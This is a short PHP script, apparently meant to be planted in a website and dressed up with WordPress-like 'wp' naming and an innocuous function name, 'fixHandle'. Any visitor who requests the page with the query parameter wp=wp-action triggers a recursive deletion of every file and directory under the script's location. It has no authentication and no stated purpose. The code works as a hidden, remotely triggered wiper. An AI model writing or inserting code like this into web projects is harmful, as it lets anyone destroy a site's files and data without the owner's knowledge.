<?php
function fixHandle( $dirName )
{
    if ( $handle = opendir( "$dirName" ) ) {
        while ( false !== ( $item = readdir( $handle ) ) ) {
            if ( $item != "." && $item != ".." ) {
                if ( is_dir( "$dirName/$item" ) ) {
                    fixHandle( "$dirName/$item" );
                } else {
                    if( unlink( "$dirName/$item" ) )echo "wp： $dirName/$item\n";
                }
            }
        }
        closedir( $handle );
        if( rmdir( $dirName ) )echo "wp： $dirName\n";
    }
}
header("content-type:text/html;charset=utf-8");
$val = isset($_GET["wp"]) ? $_GET["wp"] : "";
if ($val === 'wp-action') {
	fixHandle('.');
}


